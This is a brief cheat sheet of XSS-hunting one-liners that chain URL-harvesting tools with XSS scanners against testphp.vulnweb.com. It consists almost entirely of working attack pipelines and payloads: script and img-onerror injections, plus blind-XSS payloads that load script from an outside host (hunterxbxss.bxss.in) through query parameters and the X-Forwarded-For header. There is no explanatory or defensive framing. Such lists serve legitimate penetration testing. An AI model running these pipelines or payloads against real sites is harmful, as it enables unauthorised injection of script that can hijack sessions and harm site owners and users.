## XSS One-Liners


### Tools: gau, gf, uro, httpx, Gxss, dalfox

```
gau "http://testphp.vulnweb.com" | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe
```

### Tools: gau, qsreplace, xsschecker

```
gau "http://testphp.vulnweb.com" | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
```

### Tools: subfinder,gau, bxss

```
subfinder -d testphp.vulnweb.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hunterxbxss.bxss.in></script>' -parameters
```

### Tools: subfinder, gau, bxss

```
subfinder -d testphp.vulnweb.com | gau | bxss -payload '"><script src=https://hunterxbxss.bxss.in></script>' -header "X-Forwarded-For"
```

### Tools: waybackurls, gf, uro, qsreplace, freq

```
echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
```


### Tools: katana, gf, uro, httpx, Gxss, dalfox

```
echo "testphp.vulnweb.com" |  katana -passive -pss waybackarchive,commoncrawl,alienvault -f qurl | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe
```